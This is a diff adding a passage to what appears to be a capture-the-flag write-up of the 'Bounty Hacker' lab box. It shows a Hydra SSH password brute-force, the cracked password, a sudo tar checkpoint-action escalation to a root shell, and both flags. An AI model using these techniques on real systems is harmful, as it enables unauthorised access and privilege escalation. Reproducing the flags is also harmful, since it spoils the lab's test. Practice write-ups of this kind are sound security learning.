@@ -180,6 +180,59 @@ BoxIP: 10.10.85.238
     -lin
 
 
+        ┌──(root💀kali)-[/home/kali/bounty]
+        └─# hydra -l lin -P locks.txt 10.10.85.238 ssh                                 
+        Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-24 13:59:48
+        [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+        [DATA] attacking ssh://10.10.85.238:22/
+        [22][ssh] host: 10.10.85.238   login: lin   password: RedDr4gonSynd1cat3
+
+
+        lin@bountyhacker:~/Desktop$ ls
+        user.txt
+        lin@bountyhacker:~/Desktop$ cat user.txt
+        THM{CR1M3_SyNd1C4T3}
+
+        lin@bountyhacker:~/Desktop$ sudo -l
+        [sudo] password for lin: 
+        Matching Defaults entries for lin on bountyhacker:
+            env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+        User lin may run the following commands on bountyhacker:
+            (root) /bin/tar
+
+
+        lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+        tar: Removing leading `/' from member names
+        # whoami
+        root
+        # cd /root
+        # ls -la
+        total 40
+        drwx------  5 root root 4096 Jun  7  2020 .
+        drwxr-xr-x 24 root root 4096 Jun  6  2020 ..
+        -rw-------  1 root root 2694 Jun  7  2020 .bash_history
+        -rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+        drwx------  2 root root 4096 Feb 26  2019 .cache
+        drwxr-xr-x  2 root root 4096 Jun  7  2020 .nano
+        -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+        -rw-r--r--  1 root root   19 Jun  7  2020 root.txt
+        -rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor
+        drwx------  2 root root 4096 Jun  7  2020 .ssh
+        # cat root.txt
+        THM{80UN7Y_h4cK3r}
+
+
+
+
+
+
+
+
+
 
 
 
